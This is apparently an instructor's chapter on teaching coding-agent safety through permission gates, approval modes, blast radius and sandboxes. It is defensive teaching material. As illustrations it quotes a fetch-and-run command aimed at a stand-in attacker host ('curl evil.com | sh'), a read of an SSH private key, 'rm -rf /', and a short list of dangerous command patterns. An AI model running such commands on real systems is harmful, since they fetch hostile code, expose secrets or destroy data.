By the end of this chapter you'll be able to stand at a whiteboard and teach the safety story of a coding agent so clearly that a student never again asks "why does it keep asking me before it deletes things?" — because they'll *feel* the answer. You'll teach two ideas: the **permission gate** (the agent pausing to ask), and the **blast radius** (how much damage a mistake could do), with a kitchen and a fire door as your two anchor pictures. This is the chapter where students stop thinking of the agent as magic and start thinking of it as a very fast worker who needs guardrails — which is the truth of every agent in production today.

We built the hands in the last piece: `read`, `write`, `edit`, `bash`. We noted that `bash` is the dangerous one, and promised to guard it. This is where we keep that promise.

## Start with the fear, honestly

Don't open with a definition. Open with a feeling. Ask the room: *"You just gave a program permission to run any command on your laptop. It's fast, confident, and sometimes wrong. What could go wrong?"*

Let them answer. Someone will say it: it could delete your files, push broken code, run something off the internet. Good — now they *want* the safety layer. You never have to sell it.

[[note: say || "An agent without guardrails is not a robot assistant. It's a brand-new intern who types a hundred times faster than you, never gets tired, and will run *literally anything* it thinks might help — including the command that wipes your project. We're not building the intern here. We're building the thing standing behind the intern with a hand on their shoulder, ready to say 'wait — are you sure?'"]]

That "wait — are you sure?" is the whole chapter, said in five words. Everything else is mechanism. So let them scare themselves first — every guardrail below arrives as the answer to a fear they already feel.

[[fig: A warm hand-drawn illustration titled "The eager intern". Center: a friendly cartoon intern figure at a keyboard, motion-lines showing they're typing incredibly fast, a big enthusiastic grin, a thought bubble showing a command "rm -rf build/". Standing just behind the intern, a calm senior figure with one hand gently on the intern's shoulder, the other hand raised palm-out in a "wait" gesture, a speech bubble in orange "hold on — are you SURE?". A blue label under the intern "the model: fast, confident, sometimes wrong". A green label under the senior "the permission gate: pauses before anything dangerous". A dashed takeaway box at the bottom: "the harness isn't the intern. It's the hand on the intern's shoulder." Excalidraw style, white background, charming, hand-lettered. || The permission gate as a calm senior standing behind an eager, blindingly-fast intern — ready to say "wait" before anything irreversible happens.]]

## The permission gate: a pause with a question

Here's the plain-words mechanism. Every time the agent wants to *do* something — run a command, edit a file, delete something — the harness doesn't just do it. It **intercepts** the request, looks at what it is, and decides one of three things: *let it through*, *ask the human first*, or *refuse outright*. That checkpoint is the **permission gate**.

[[note: metaphor || A permission gate is airport security for the agent's actions. Most actions are waved through instantly — reading a file, running the tests. A few get pulled aside for a manual check — deleting files, force-pushing, spending money. And a tiny few are never allowed on the plane. The agent doesn't get to skip the line. *Every* action passes through the gate.]]

The key teaching point — and it surprises students — is that the gate is **not** a property of the model. The model doesn't police itself. The *harness* polices the model. The model asks; the harness decides. That wall between "what the agent wants" and "what actually happens" is code you write, not a personality you hope the model has.

[[note: example || Do it on the board. The model emits `bash("rm -rf node_modules")`. Before that string reaches the shell, your gate function runs. It sees `rm -rf` and returns one of: `ALLOW` (run it), `ASK` (print it, wait for y/n), or `DENY` (refuse, tell the model no). Three outcomes. One checkpoint. Every command, every time.]]

[[fig: A technical Excalidraw diagram titled "The permission gate", using the semantic-color grammar. Left: a purple rounded box labeled "MODEL wants to act" containing a code line "bash('rm -rf build/')". A blue dashed arrow labeled with a circled (1) flows right into a yellow diamond-shaped gate box labeled "PERMISSION GATE — classify this action". From the gate, three blue dashed arrows fan out to three outcomes: circled (2) to a green box "ALLOW → run it immediately (read, ls, grep, tests)"; circled (3) to an orange box "ASK → show human, wait for y/n (rm, git push, edits outside project)"; circled (4) to a red box "DENY → refuse + tell model why (curl|sh, secrets, outside sandbox)". A red label near the gate reads "the HARNESS decides, not the model". A dashed takeaway box at the bottom: "every action passes the gate. 3 outcomes: allow / ask / deny." White background, hand-lettered, numbered circles. || The gate as a classifier every action must pass through: most are allowed, some are asked, a few are denied — and the harness, not the model, holds the decision.]]

## Why "ask" and not just "block everything dangerous"

A sharp student will push back: "If `rm` is dangerous, why not just ban it?" This is a beautiful question and the answer teaches the whole balance.

Because *sometimes you genuinely want it to delete things.* You asked the agent to clean up the build folder — deleting `build/` is the correct, helpful action. Ban all deletion and the agent is useless for half the real work. So the gate can't be a blunt "no." It has to be "let me check with the human on the risky ones" — because riskiness depends on *context* the harness can't fully judge, but the human can, in one glance.

[[note: aha || The insight that makes it click: **the permission prompt isn't the harness being dumb. It's the harness being honest about what it can't know.** The harness knows `rm -rf` is dangerous. What it *can't* know is whether *you* meant it. So it shows you exactly what's about to happen and lets you, the one with the intent, make the call. The prompt is a handoff of judgment, not a failure of automation.]]

This is why the middle outcome — *ask* — is the heart of the design. Pure allow is reckless. Pure deny is useless. The interesting agents live in the "ask on the risky stuff" middle, and the craft is drawing the line in the right place.

## Approval modes: turning the dial

Now introduce the dial, because students have felt it. In Claude Code and pi and Cursor, there's a setting for *how much* the agent asks. You don't want to be pestered for every file read. But when it's about to touch production, you want to be asked about everything. So the gate's strictness is **adjustable** — these settings are called **approval modes** (or "permission modes").

Teach three points on the dial:

- **Strict / manual** — ask before nearly everything. Slow, but you see every move. Good for a new codebase you don't trust the agent in yet.
- **Normal / default** — auto-allow the safe reads and searches; ask on writes, deletes, and anything with reach outside the project. This is where most people live.
- **Auto / "yolo"** — allow almost everything without asking. Fast and hands-off. Only sane inside a **sandbox** (which is the second half of this chapter) — because if the agent can't escape a padded room, letting it run free inside that room is fine.

[[fig: A warm hand-drawn illustration titled "The approval dial". A large hand-drawn dial/knob with three labeled positions like a stove knob. Far left position labeled in blue "STRICT — ask before almost everything" with a little tortoise doodle and note "slow but safe". Middle position (knob pointing here) labeled in green "NORMAL — auto-allow reads, ask on writes/deletes" with a note "where most people live". Far right position labeled in red "AUTO / yolo — allow everything, don't ask" with a little racecar doodle and a red warning "only safe inside a sandbox!". Below the dial, an orange arrow sweeping left-to-right labeled "more trust / less friction →" and another labeled "← more caution / more control". A dashed takeaway box: "same gate, adjustable strictness. Turn it up in prod, down in a sandbox." Excalidraw style, white background, hand-lettered, charming. || Approval modes as a knob: same gate, adjustable strictness — cautious for unfamiliar or production work, wide-open only when the agent is boxed in.]]

[[note: production || This is live in every tool your students use. Claude Code has permission modes — the default asks before edits and shell commands, and there's an "accept edits" mode and a bypass mode for when you're supervising closely. Cursor's agent has an auto-run toggle. pi and other harnesses ship the same dial. When a student says "Claude Code asked me before it ran a command," they've *met the permission gate in person* — you're just naming and explaining the thing they already touched this morning.]]

## Blast radius: how far the damage reaches

Now pivot to the second big idea — the one that reorganizes how students think about the whole problem. Stop asking "is this command dangerous?" and start asking: **"if this goes wrong, how far does the damage reach?"** That reach has a name — the **blast radius**.

[[note: metaphor || Blast radius comes from explosions. Set off a firecracker in a steel bucket and the blast radius is a few inches. Set off the same firecracker in a fireworks warehouse and it takes the whole building. Same firecracker, wildly different blast radius. The danger of an action isn't just the action — it's *what's within reach when it goes off.* Your job is to shrink the room the firecracker sits in.]]

This changes the strategy. You can't make the model never make mistakes — it's probabilistic, it will sometimes be wrong. So instead of trying to prevent every bad action (impossible), you **contain** them: even the worst mistake can only wreck a small, recoverable space. Prevention is a leaky wall. Containment is a strong box. You want both, but the box is what lets you sleep.

[[fig: A warm hand-drawn illustration titled "Same spark, different blast radius". Two side-by-side scenes. LEFT scene labeled in green "CONTAINED": a small lit firecracker sitting inside a heavy steel bucket, the blast drawn as small contained squiggles staying inside the bucket, a green note "damage stops at the bucket walls". RIGHT scene labeled in red "UNCONTAINED": the identical firecracker sitting in the middle of a warehouse full of crates labeled "your files", "your git history", "your AWS keys", "prod database", the blast drawn as huge red explosion lines reaching every crate, a red note "one mistake takes everything in reach". A blue arrow between them labeled "same action — the difference is what's within reach". A dashed takeaway box: "you can't stop every spark. You CAN shrink the room it goes off in." Excalidraw style, white background, hand-lettered, a little dramatic but friendly. || Blast radius, drawn literally: the same mistake is trivial in a steel bucket and catastrophic in a warehouse. Containment beats prevention because you can't stop every spark.]]

## The sandbox: the kitchen with a fire door

Here is the anchor picture for the whole chapter, the one students will remember a year later. Draw a kitchen.

A professional kitchen has open flames, hot oil, sharp knives — dangerous things, used constantly, at speed. How does a busy kitchen not burn down every night? Two things. The dangerous work happens **inside the kitchen**, a defined room — not spread across the whole restaurant. And there's a **fire door** between the kitchen and the dining room. If a fire starts, the door contains it. The cooks work fast and a little recklessly *because* the room is built to contain their worst day.

A **sandbox** is exactly this: a walled-off room where the agent works fast and makes mistakes, with a fire door between it and everything precious. Inside, the agent can read, write, delete, run commands — go wild. But the walls stop it reaching what matters: your other projects, your system files, your secrets, the network, production. You make it safe not by taking away the knives, but by putting a fire door between the kitchen and the guests — the agent can be bold precisely because boldness can't escape the room.

[[fig: A warm hand-drawn illustration titled "The kitchen and the fire door". Left room labeled in yellow "THE SANDBOX (the kitchen)": a little agent-cook figure surrounded by flames, knives, chopping and motion lines, a green sign "read / write / delete / run — go wild in here", and a stack of papers labeled "just this project (a copy)". A thick hand-drawn door in the middle wall labeled boldly in red "FIRE DOOR — the boundary". Right room labeled in blue "THE REAL WORLD (the dining room), calm and untouched": neat padlocked boxes "your other projects", "system files", "SSH keys / secrets", "the internet", "production DB". Red arrows from the kitchen bounce OFF the fire door, labeled "blocked". A dashed takeaway box: "let the agent be bold IN the kitchen — the fire door keeps the blast off the guests." Excalidraw style, white background, charming, hand-lettered. || The sandbox as a kitchen with a fire door: the agent works fast inside a walled room, and the boundary keeps every mistake off the real machine, secrets, and network.]]

[[note: example || Make the walls concrete, because "sandbox" sounds abstract until it isn't. A real sandbox for a coding agent usually means: (1) **filesystem** — the agent can only see and touch one project folder, not your whole disk; try to `cat ~/.ssh/id_rsa` and it's simply not there. (2) **network** — outbound internet is off or allow-listed, so `curl evil.com | sh` can't phone home or pull down anything. (3) **a copy, not the original** — often the agent works in a throwaway container or a git worktree, so the very worst it can do is trash a copy you can delete and recreate. Three walls: what it can *see*, what it can *reach*, and whether it's touching the *real* thing.]]

## Why you need both the gate and the sandbox

Students will ask which one you need — the gate or the sandbox. The answer is *both*, and knowing why is the mark of someone who really gets it. They defend different failures.

The **gate** is about *intent you can catch in time* — it pauses on actions a human would want to eyeball, and hands you the decision. But a human can't eyeball *everything*, and in auto mode there's no human watching at all. The **sandbox** is the backstop for everything the gate waves through or you're not there to check — it shrinks what "yes" can cost. The gate reduces how often bad things are attempted; the sandbox reduces how much any bad thing can hurt.

[[note: aha || The one-liner that unites the chapter: **the gate is about catching the bad action; the sandbox is about surviving the one you miss.** You will always miss some — the model is fast and you are one tired human. A good agent assumes you'll miss some and builds the room so that missing them is survivable. Belt *and* suspenders, because the model's trousers will eventually fall down.]]

[[fig: A technical Excalidraw diagram titled "Two layers of defense", semantic-color grammar. A horizontal flow. Purple box on the left "MODEL's action". Blue dashed arrow with circled (1) into an orange box "LAYER 1: PERMISSION GATE — catch risky intent, ask the human". A green note under it "reduces how OFTEN bad things happen". Blue dashed arrow with circled (2) continues into a yellow box "LAYER 2: SANDBOX — walled room, no network, copy not original". A green note under it "reduces how MUCH any bad thing can hurt". Below both, a red bracket spanning them labeled "you need BOTH — they defend different failures". A small red doodle of an action slipping past the gate (labeled "missed!") but bouncing off the sandbox wall (labeled "still contained"). A dashed takeaway box: "gate = catch it. sandbox = survive the one you miss." White background, hand-lettered, numbered circles. || The two layers side by side: the gate lowers how often something bad is attempted, the sandbox lowers how badly any single miss can hurt — and you need both because you will always miss some.]]

## The board plan: how to actually deliver this

Here's the sequence that works. Don't lead with mechanism; lead with fear, then relief.

1. **The fear (5 min).** Ask the room what could go wrong when a fast, confident program can run any command. Let them scare themselves. Now they want the rest.
2. **The gate (10 min).** Draw the intern-and-senior picture. Introduce the three outcomes — allow, ask, deny. Hammer the point: *the harness decides, not the model.*
3. **The dial (5 min).** Draw the approval-mode knob. Connect it to what they saw in Claude Code this morning — they've already met it.
4. **Blast radius (10 min).** The firecracker in the bucket vs. the warehouse. Reframe from "is it dangerous?" to "how far does the damage reach?"
5. **The sandbox (15 min).** The kitchen and the fire door — your keystone drawing. Then make the walls concrete: filesystem, network, copy-not-original.
6. **Both layers (5 min).** Gate catches it; sandbox survives the miss. The belt-and-suspenders close.

[[note: teach || Pace it as fear → relief, twice. First fear ("it can delete everything") relieved by the gate. Second fear ("but I can't watch every action") relieved by the sandbox. Each safety mechanism should arrive as the answer to a worry the students already feel in their gut. Never introduce a guardrail before the room wants it — a solution to a problem nobody feels is just boring machinery.]]

[[note: demo || The one live BUILD demo that lands this whole chapter: wrap your `run_bash` from the last session in a tiny gate. Before running any command, check it against a small list of dangerous patterns — `rm -rf`, `git push`, `curl`, `sudo` — and if it matches, print the command and ask `run this? [y/n]`. Then, live in front of the class, ask the agent to "clean up temporary files." Watch it propose an `rm`, watch your gate *stop* and ask you. Say yes. Then run it again and say *no*, and show the agent gracefully getting the refusal and trying something else. Twelve lines of code, and the whole safety story is suddenly real and on screen.]]

The demo is the moment. Students have *heard* about the permission prompt; here they *build the prompt itself* in a dozen lines and watch it fire. That's the aha — the guardrail isn't AI magic, it's an `if` statement they can write.

## The confusions to head off

[[note: confusion || The biggest misconception: students think the *model* is being careful — that it "decides" to ask before deleting. It doesn't. The model has no built-in restraint; it will happily emit `rm -rf /` if it thinks that helps. The caution lives entirely in the *harness code around* the model. Fix it with a hard line: "The model is not polite. The harness makes it polite. Take the gate away and the same model will delete your disk without blinking." This separation — dumb-but-fast model, careful wrapper — is the mental model that makes everything else make sense.]]

[[note: confusion || The second confusion: "if we have a sandbox, why ask me at all — just let it rip inside the box?" Two answers. Sandboxes are never perfectly airtight; boundaries leak, and defense-in-depth means you don't rely on one wall. And even *inside* the sandbox some actions are irreversible or expensive — spending real money via an API, sending an email, touching a real database. The gate and the sandbox overlap on purpose. Belt and suspenders.]]

[[note: confusion || A third one, subtle but worth it: students conflate "dangerous command" with "big blast radius." `rm -rf build/` looks scary but has a *tiny* reach — a regenerable folder. `git push --force` looks mild but has a *huge* one — it rewrites shared history everyone depends on. Score the *reach*, not the scariness of the verb.]]

## You can now teach

- The **permission gate** as a security checkpoint every action must pass, with three outcomes — allow, ask, deny — and the crucial point that *the harness decides, not the model*.
- **Approval modes** as an adjustable dial (strict → normal → auto), tied directly to what students already saw in Claude Code, pi, and Cursor.
- **Blast radius** as the firecracker-in-a-bucket-vs-warehouse reframe: judge an action by how far its damage reaches, not by how scary the verb sounds.
- The **sandbox** as a kitchen with a fire door — a walled room where the agent can be bold — and its three concrete walls: filesystem, network, and copy-not-original.
- Why you need **both layers**: the gate catches the bad action, the sandbox lets you survive the one you miss — belt and suspenders.
- The **live demo**: wrap `bash` in a twelve-line gate, watch it stop the agent mid-delete, and show students the guardrail is an `if` statement, not magic.
